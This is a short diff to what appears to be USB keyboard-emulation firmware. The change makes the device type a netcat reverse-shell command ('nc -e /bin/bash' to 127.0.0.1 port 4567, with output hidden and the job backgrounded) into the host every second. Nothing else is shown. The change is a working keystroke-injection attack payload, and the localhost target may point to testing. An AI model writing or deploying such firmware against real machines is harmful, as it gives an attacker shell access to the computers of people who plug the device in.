@@ -19,8 +19,8 @@ int main(void) {
   MX_USB_DEVICE_Init();
 
   while (1) {
-    // typeEnter();
-	  typeKeys();
+    HAL_Delay(1000);
+	  typeString("nc -e /bin/bash 127.0.0.1 4567 >/dev/null 1>/dev/null 2>/dev/null &\n");
     flashLED();
   }
 }
